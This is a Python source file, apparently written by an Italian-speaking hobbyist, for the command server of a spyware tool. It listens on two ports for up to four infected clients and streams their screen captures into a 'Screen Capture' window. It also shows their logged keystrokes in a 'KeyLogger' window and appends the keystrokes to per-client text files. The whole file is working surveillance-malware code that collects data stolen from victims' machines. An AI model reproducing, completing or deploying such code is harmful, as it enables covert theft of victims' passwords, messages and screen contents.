from Tkinter import *
import time,sys,os
from threading import Thread
import socket
import base64, zlib
import win32api
import win32con
from ctypes import *

def closeAllWindows():
    for f in files:
        files[f].close()
    txtsock.close()
    imgsock.close()
    rootListaClient.destroy()
    os._exit(0)

def riceviImg(conn,addr):
    while clientAttivo == addr:
        try:
            data = conn.recv(buffer_size)
            msg = zlib.decompress(data)
            encodedData = base64.b64encode(msg)
            photo = PhotoImage(data = encodedData)
            photo = photo.subsample(2)
            label.configure(image = photo)
            label.image = photo #per il garbage colector
        except:
            continue

    #conn.close()

def riceviTxt(conn,addr):
    text.delete("1.0",END)
    while clientAttivo == addr:
        try:
            data = conn.recv(buffer_size)
            files[addr].write(data)
            text.config(state = NORMAL)
            text.insert(END,data)
            text.config(state = DISABLED)
        except:
            continue

def callback(event):
    for d in clients:
        if event.widget == d["btn"]:
            d["btn"]["bg"] = "green"
        else:
            d["btn"]["bg"] = "#d3d3d3"

    d = next(x for x in clients if x["btn"] == event.widget)
    connimg = d["imgconn"]
    conntxt = d["txtconn"]
    addr = d["addr"]
    global clientAttivo
    if clientAttivo != addr:
        clientAttivo = addr
        t1 = Thread(target = riceviTxt, args = (conntxt,addr))
        files[addr] = open(addr+".txt","a+")
        t2 = Thread(target = riceviImg, args = (connimg,addr))
        t1.start()
        t2.start()

def acceptClients():
    while len(clients) < maxClient:
        imgconn, imgaddr = imgsock.accept() #(connessione, addr_client) # addr_client = (indirizzo, porta)
        txtconn, txtaddr = txtsock.accept()
        btn = Button(rootListaClient)
        btn.bind("<Button-1>",callback)
        btn.config(text = imgaddr[0], height = 4,bg = "#d3d3d3")
        btn.pack(fill=X)
        d = {"addr" : imgaddr[0], "imgconn" : imgconn, "txtconn" : txtconn, "btn" : btn}
        clients.append(d)

def start():
    t = Thread(target = acceptClients)
    t.start()

pid = win32api.GetCurrentThreadId()

host = "192.168.43.236"
imgport = 12345
txtport = 12346
buffer_size = 1024**2
maxClient = 4

clients = []
files = {}
clientAttivo = None

imgsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
imgsock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
imgsock.bind((host,imgport))
imgsock.listen(maxClient)

txtsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
txtsock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
txtsock.bind((host,txtport))
txtsock.listen(maxClient)

rootListaClient = Tk()
rootListaClient.wm_title("Lista client")
rootListaClient.resizable(0,0)
rootListaClient.geometry("220x284+10+10")
rootListaClient.protocol("WM_DELETE_WINDOW", closeAllWindows)

Screen = Toplevel()
Screen.wm_title("Screen Capture")
Screen.resizable(0,0)
Screen.geometry("+500+10")
Screen.protocol("WM_DELETE_WINDOW", closeAllWindows)
label = Label(Screen)
label.pack(fill = BOTH)

KeyLogger = Toplevel()
KeyLogger.wm_title("KeyLogger")
KeyLogger.resizable(0,0)
KeyLogger.geometry("700x250+10+400")
KeyLogger.protocol("WM_DELETE_WINDOW", closeAllWindows)
text = Text(KeyLogger)
text.config(state = DISABLED)
scrollb = Scrollbar(KeyLogger,command=text.yview)
scrollb.pack(side=RIGHT, fill=Y)
text.pack(fill = BOTH)

rootListaClient.after(1000,start)
rootListaClient.mainloop()
